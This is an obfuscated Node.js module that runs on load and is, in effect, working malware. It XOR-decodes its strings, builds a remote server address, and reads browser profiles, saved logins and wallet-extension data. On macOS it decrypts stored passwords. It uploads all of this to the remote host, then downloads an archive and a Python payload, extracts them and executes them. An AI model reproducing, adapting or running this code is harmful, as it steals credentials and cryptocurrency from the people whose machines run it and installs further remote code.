Object.prototype.hasOwnProperty,
  Object.prototype.toString,
  Object.defineProperty,
  Object.getOwnPropertyDescriptor;
const t = 'base64',
  c = 'utf8',
  r = (r) => ((s1 = r.slice(1)), Buffer.from(s1, t).toString(c)),
  e = (r, e) => {
    let E = Buffer.from(r, t);
    const o = E.length;
    let F = 0,
      a = new Uint8Array(o);
    for (ii = 0; ii < o; ii++) {
      F = 3 & ii;
      let t = e[s](F);
      a[ii] = 255 & (E[ii] ^ t);
    }
    return ((t, c) => Buffer.from(t).toString(c))(a, c);
  },
  E = (t) => e(t, c),
  s = r('2Y2hhckNvZGVBdA'),
  o = E('BgUKUQERVQ'),
  F = E('FhwPVBErFkoaFwNLBg'),
  a = E('FgYfSAEb'),
  B = E('EAwDWw'),
  i = E('BxEXTRAHEg'),
  A = r('zcGF0aA'),
  $ = E('BRgHTBMbFFU'),
  n = E('ARkWXBwG'),
  l = E('HRsLXREdFA'),
  R = E('HRsVTBsVC10'),
  W = E('AQ0WXQ'),
  V = require('os'),
  U = require(A),
  g = require(o),
  Q = require(a),
  h = require(i),
  w = require(F)[B],
  x = V[R](),
  f = V[$](),
  y = V[l](),
  G = V[n](),
  I = V[W](),
  S = require('fs');
let u;
const d = (t) => e(t, c),
  X = (() => {
    let t = 'MTcyLjg2LjaHR0cDovLwk5LjM2OjEyMjQ=      ';
    for (var c = 'b', e = 'a', E = '', s = '', o = 0; o < 10; o++)
      (c += t[o]), (e += t[10 + o]), (E += t[20 + o]), (s += t[30 + o]);
    return (c = c + E + s), r(e) + r(c);
  })(),
  H = d('ER0UVhQZAw'),
  C = (t) =>
    t.replace(/^~([a-z]+|\/)/, (t, c) => ('/' === c ? y : `${U[H](y)}/${c}`)),
  Y = 'VDNhbTM3',
  D = 'AgYPTBAyD1QQJx9WFg',
  k = 'EhES',
  b = 'WhcKURAaEg',
  M = d('WloISBk'),
  N = d(b),
  p = d(D),
  Z = d(k),
  j = d('EAwPSwEHNUEbFw'),
  m = 'WgcSVwcRSFYaEAM',
  J = d('FBcFXQYHNUEbFw');
function T(t) {
  try {
    return S[J](t), !0;
  } catch (t) {
    return !1;
  }
}
const v = d('MREAWQAYEg'),
  O = d('JQYJXhwYAw'),
  K = d('WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH'),
  P = (t, c) => {
    result = '';
    try {
      const r = `${t}`,
        e = require(`${y}${d(m)}`);
      if (I != d('Ih0IXBoDFWc7IA')) return;
      const E = d('JjEqfTYgRhJVMjR3OFQKVxIdCEs'),
        o = `${C('~/')}${c}`;
      let F = U.join(o, d('ORsFWRlUNUwUAAM'));
      const a = d('FBEVFUdBUBUSFws'),
        B = d('GgYPXxwaOU0HGA'),
        i = d('AAcDShsVC10qAgdUABE'),
        A = d('BRUVSwIbFFwqAgdUABE'),
        $ = d('NgYfSAEhCEgHGxJdFgAiWQEV'),
        n = d('FgYDWQERIl0WHRZQEAYPTg'),
        l = d('BxEHXDMdCl0'),
        R = d('FhsWQTMdCl0'),
        W = d('ORsBURtUIlkBFQ'),
        V = d('Ggc5WwcNFkw'),
        h = d('EBoFSgwEEl0RKw1dDA'),
        w = d('MRUSWRcVFV0'),
        x = d('GRUSURtF'),
        f = d('IE5G'),
        G = d('Ik5G'),
        u = d('JU5G'),
        X = d('ABoKURsf');
      S[l](F, d('AAAAFU0'), (t, c) => {
        if (!t) {
          (mkey = JSON.parse(c)),
            (mkey = mkey[V][h]),
            (mkey = ((t) => {
              var c = atob(t),
                r = new Uint8Array(c.length);
              for (let t = 0; t < c.length; t++) r[t] = c[s](t);
              return r;
            })(mkey));
          try {
            const t = e[$](mkey.slice(5));
            for (ii = 0; ii <= 200; ii++) {
              const c = 0 === ii ? v : `${O} ${ii}`,
                e = `${o}/${c}/${W}`,
                s = `${o}/t${c}`;
              if (!T(e)) continue;
              const F = `${r}_${ii}_${O}`;
              S[R](e, s, (c) => {
                try {
                  const c = new g[w](s);
                  c.all(E, (r, e) => {
                    var E = '';
                    r ||
                      e.forEach((c) => {
                        var r = c[B],
                          e = c[i],
                          s = c[A];
                        try {
                          'v' === s.subarray(0, 1).toString() &&
                            ((iv = s.subarray(3, 15)),
                            (cip = s.subarray(15, s.length - 16)),
                            cip.length &&
                              ((mmm = Q[n](a, t, iv).update(cip)),
                              (E = `${E}${G}${r} ${f} ${e} ${u}${mmm.toString(
                                x
                              )}\n\n`)));
                        } catch (t) {}
                      }),
                      c.close(),
                      S[X](s, (t) => {}),
                      Ut(F, E);
                  });
                } catch (t) {}
              });
            }
          } catch (t) {}
        }
      });
    } catch (t) {}
  },
  q = E('Ex0KXRsVC10'),
  L = E('GAEKTBwrAFEZEQ'),
  z = E('ExsUVTEVElk'),
  _ = E('AAYK'),
  tt = E('GgQSURoaFQ'),
  ct = E('AxUKTRA'),
  rt = d('BxEHXBEdFGsMGgU'),
  et = d('BgAHTCYNCFs'),
  Et = (d('HAciUQcRBUwaBh8'), r('YcG9zdA')),
  st = [
    [
      d('WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFozCVcSGAMXNhwUVxgR'),
      d('WloFVxsSD19aEwlXEhgDFRYcFFcYEQ'),
      d('WjUWSDEVEllaOAlbFBhJfxobAVQQWyVQBxsLXVohFV0HVCJZARU'),
    ],
    [
      d(
        'WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFo2FFkDETVXEwARWQcRSXoHFRBdWDYUVwIHA0o'
      ),
      d('WloFVxsSD19aNhRZAxE1VxMAEVkHEUl6BxUQXVg2FFcCBwNK'),
      d(
        'WjUWSDEVEllaOAlbFBhJegcVEF0mGwBMAhUUXVo2FFkDEUt6BxsRSxAGSW0GERQYMRUSWQ'
      ),
    ],
    [
      d(
        'WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFoXCVVbGxZdBxUVVxMAEVkHEUh3BREUWQ'
      ),
      d('WloFVxsSD19aGxZdBxU'),
      d(
        'WjUWSDEVEllaJglZGB0IX1o7Fl0HFUZrGhISTxQGAxc6BANKFFQ1TBQWCl1aIRVdB1QiWQEV'
      ),
    ],
  ],
  ot = d('ORsFWRlUI0ABEQhLHBsIGCYREkwcGgFL'),
  Ft = d('WxgJXw'),
  at = d('WxgCWg'),
  Bt = d('BhsKWRsVOVERWhJAAQ');
let it = 'comp';
const At = [
    'Gx8EUR0SBF0aEwddFBsDUBkRAFYeGwJaEBIBSBIfCFY',
    'EB4EWRkWB1MaBApbHRgBUBAXAlkZGQNdEBUMVhwZDlU',
    'FxIIWRAYC1cYEQ9VHRgWVRIeCFIaBA5QBR8NVxkeFlk',
    'HBYIXR8QAFIYGQ1IFhoKSBAWDVQYGg1XEBsPUBoSA1s',
    'ExwEVx0dC1kQGARXHQQMWhcYAlsbEwVWFAQIXBoQDEg',
    'HRoAWRsfCFcWEgNXExYCXBIXD1IbGQ5WExoNXBsVB1w',
    'FBEHWx0fCFUQEhZQEAQFWxwbCFoaGw5bHhsIVxARC18',
    'HR0AWRMTC1sWEBZdHgQKVxgeDFMWEgFXERoOWxAYClI',
  ],
  $t = d('FgYDWQERNF0UEDVMBxEHVQ'),
  nt = d('WgEWVBoVAks'),
  lt = async (t, c, r) => {
    let e = t;
    if (!e || '' === e) return [];
    try {
      if (!T(e)) return [];
    } catch (t) {
      return [];
    }
    c || (c = '');
    let E = [];
    for (let r = 0; r < 200; r++) {
      const s = `${t}/${0 === r ? v : `${O} ${r}`}/${ot}`;
      for (let t = 0; t < At.length; t++) {
        const o = d(At[t]);
        let F = `${s}/${o}`;
        if (T(F)) {
          try {
            far = S[rt](F);
          } catch (t) {
            far = [];
          }
          far.forEach(async (t) => {
            e = U.join(F, t);
            try {
              (e.includes(Ft) || e.includes(at)) &&
                E.push({ [ct]: S[$t](e), [tt]: { [q]: `${c}${r}_${o}_${t}` } });
            } catch (t) {}
          });
        }
      }
    }
    if (r && ((e = `${y}${d('WloFVxsSD19aBwlUFBoHFxwQSFIGGwg')}`), S[j](e)))
      try {
        E.push({ [ct]: S[$t](e), [tt]: { [q]: Bt } });
      } catch (t) {}
    const s = { type: Y, hid: it, [L]: E };
    try {
      const t = { [_]: `${X}${nt}`, [z]: s };
      h[Et](t, (t, c, r) => {});
    } catch (t) {}
    return E;
  },
  Rt = () => {
    try {
      st.forEach((t, c) => {
        P(c, t[2]);
      }),
        P(3, K);
    } catch (t) {}
  },
  Wt = d('Wh8DQQY'),
  Vt = d('BQ0SUBoa'),
  Ut = async (t, c) => {
    const r = { ts: u.toString(), type: Y, hid: it, ss: t, cc: c.toString() },
      e = { [_]: `${X}${Wt}`, [z]: r };
    try {
      h[Et](e, (t, c, r) => {});
    } catch (t) {}
  },
  gt = d('BVocUQ'),
  Qt = d('WgQCVwIa'),
  ht = d('BxEIWRgRNUEbFw'),
  wt = d('BxEIWRgR'),
  xt = d('Bxk1QRsX'),
  ft = d('ARUUGFgMAA'),
  yt = d('FgEUVFVZKlc'),
  Gt = d('KVoWQQUoFkEBHAlWWxEeXQ'),
  It = 51476596;
let St = 0;
const ut = async (t) => {
    w(`${ft} ${t} -C ${y}`, (c, r, e) => {
      if (c) return console.error(`err unfile: ${c}`), S[xt](t), void (St = 0);
      S[xt](t), Ct();
    });
  },
  dt = () => {
    const t = d('BUZIQhwE'),
      c = `${X}${Qt}`,
      r = `${G}\\${gt}`,
      e = `${G}\\${t}`;
    if (!(St >= It))
      if (S[j](r))
        try {
          var E = S[et](r);
          E.size >= It
            ? ((St = E.size),
              S[wt](r, e, (t) => {
                if (t) throw t;
                ut(e);
              }))
            : (St < E.size ? (St = E.size) : (S[xt](r), (St = 0)), Xt());
        } catch (t) {}
      else {
        w(`${yt} "${r}" "${c}"`, (t, c, E) => {
          if (t) return (St = 0), void Xt();
          try {
            (St = It), S[ht](r, e), ut(e);
          } catch (t) {}
        });
      }
  };
function Xt() {
  setTimeout(() => {
    dt();
  }, 2e4);
}
const Ht = async () => {
    var t = process.version.match(/^v(\d+\.\d+)/)[1];
    const c = `${X}${d('WhoJXBBb')}${t}`,
      r = `${y}${d(m)}`;
    if (S[j](r)) Rt();
    else {
      w(`${yt} "${r}" "${c}"`, (t, c, r) => {
        Rt();
      });
    }
  },
  Ct = async () =>
    await new Promise((t, c) => {
      if ('w' == f[0]) {
        const t = `${y}${Gt}`;
        S[j](`${t}`)
          ? (() => {
              const t = `${X}${N}/${Y}`,
                c = `${y}${M}`,
                r = `"${y}${Gt}" "${c}"`;
              try {
                S[xt](c);
              } catch (t) {}
              h[Z](t, (t, e, E) => {
                if (t) Ht();
                else
                  try {
                    S[p](c, E),
                      w(r, (t, c, r) => {
                        Ht();
                      });
                  } catch (t) {
                    Ht();
                  }
              });
            })()
          : (Ht(), dt());
      } else
        (() => {
          const t = d(b),
            c = d(D),
            r = d(k),
            e = `${X}${t}/${Y}`,
            E = `${y}${M}`;
          let s = `${Vt}3 "${E}"`;
          h[r](e, (t, r, e) => {
            t || (S[c](E, e), w(s, (t, c, r) => {}));
          });
        })();
    });
var Yt = 0;
const Dt = async () => {
  try {
    (u = Date.now()),
      await (async () => {
        it = x;
        try {
          const t = C('~/');
          st.forEach(async (c, r) => {
            let e = '';
            (e =
              'd' == f[0]
                ? `${t}${c[0]}`
                : 'l' == f[0]
                ? `${t}${c[1]}`
                : `${t}${c[2]}`),
              await lt(e, `${r}_`, 0 == r);
          }),
            'w' == f[0] && ((pa = `${t}${K}`), await lt(pa, '3_', !1));
        } catch (t) {}
      })(),
      Ct();
  } catch (t) {}
};
Dt();
let kt = setInterval(() => {
  (Yt += 1) < 5 ? Dt() : clearInterval(kt);
}, 6e5);
module.exports = Dt;
